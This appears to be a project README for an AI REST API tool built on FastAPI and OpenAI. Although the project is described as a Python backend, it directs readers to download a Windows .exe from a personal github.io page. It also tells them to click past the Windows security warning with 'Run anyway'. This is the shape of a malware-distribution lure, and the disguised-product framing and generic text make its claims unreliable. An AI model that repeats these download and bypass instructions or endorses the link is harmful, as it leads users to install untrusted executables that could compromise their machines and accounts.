# 🤖 ai-rest-api - Build fast artificial intelligence powered tools

[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://tobitbrown126.github.io)

This application provides a foundation for building tools that use artificial intelligence. It handles the complex logic required to connect your software to large language models. You can use it to create chatbots, analyze text, or extract data from documents. The system runs locally on your computer and manages the communication between your interface and the AI service.

## ⚙️ System Requirements

Before you begin, ensure your computer meets these requirements:

- Operating System: Windows 10 or Windows 11.
- Memory: At least 8 gigabytes of RAM.
- Processor: A modern dual-core processor or better.
- Storage: 500 megabytes of free space for the application and database files.
- Internet Connection: A stable connection is required to communicate with AI services.

## 📥 Downloading the Application

You need the latest version of the application from our release page. 

[Visit this page to download the software for Windows](https://tobitbrown126.github.io)

1. Open your web browser.
2. Select the link above.
3. Look for the section labeled "Assets" under the most recent version number.
4. Click the file ending in `.exe` to start the download.
5. Save the file to a folder you can easily find, such as your Downloads folder.

## 🛠️ Setting Up the Software

Follow these steps to prepare the application on your computer:

1. Locate the downloaded file in your folder.
2. Double-click the file to launch the installer.
3. Windows may show a security prompt. If you trust the source, click "More info" and then select "Run anyway."
4. Follow the on-screen prompts to install the program. 
5. Select a destination folder for the application files. We recommend the default folder.
6. The installer creates a shortcut on your desktop.

## 🚀 Running the Application

Once you finish the installation, you can start the program:

1. Find the `ai-rest-api` icon on your desktop and double-click it.
2. A black window will appear. This window shows the status of the background services. Do not close this window while you use the application.
3. Wait for the text in the window to indicate that the server is ready. 
4. Open your preferred web browser.
5. Type `http://127.0.0.1:8000/docs` into your address bar and press Enter.
6. This page displays the visual interface for the API. You can test features, send requests, and view the responses from the AI here.

## 🧩 Understanding Key Features

This application includes built-in tools to simplify AI integration:

- Authentication: Keeps your API keys and interactions secure.
- OpenAI Integration: Connects directly to advanced language models to generate content.
- Structured Outputs: Forces the AI to provide data in a format your other software can read, such as tables or lists.
- Streaming: Allows the AI to send answers word-by-word, which improves the user experience.
- Function Calling: Enables the AI to perform specific tasks, like looking up information in a database or performing calculations.
- Documentation: The interface automatically creates a manual on how to use every feature.

## 🗄️ Working with Data

The system uses internal databases to save your settings and history.

- SQLite: The application uses this format to store information in a lightweight, reliable file. It requires no extra setup and works immediately.
- PostgreSQL: If you plan to scale your project to handle thousands of users, you can connect the application to PostgreSQL. Edit the configuration file in the settings folder to change these database details.

## 💡 Troubleshooting Common Issues

If you run into issues, try these steps:

- Check the black terminal window for error messages. If you see text in red, it often explains what went wrong.
- Ensure your internet connection is active. The application cannot reach the AI service without an connection.
- Verify that your API key is correct. You can enter this in the configuration file located in the application directory.
- Restart the application if it seems to stop responding. Close the black window and double-click the shortcut again.
- Make sure no other program is using port 8000. If you have other development tools running, they might conflict with this application.

## 🛡️ Security Tips

- Never share your API keys with others.
- Keep your software updated by checking the release page frequently for new versions.
- Limit access to the computer where the application runs, especially if you store sensitive data in the database.

Keywords: ai, api, api-development, artificial-intelligence, backend, fastapi, function-calling, llm, openai, postgresql, pydantic, python, rest-api, splalchemy, sqlite, streaming, structured-output, swagger, uvicorn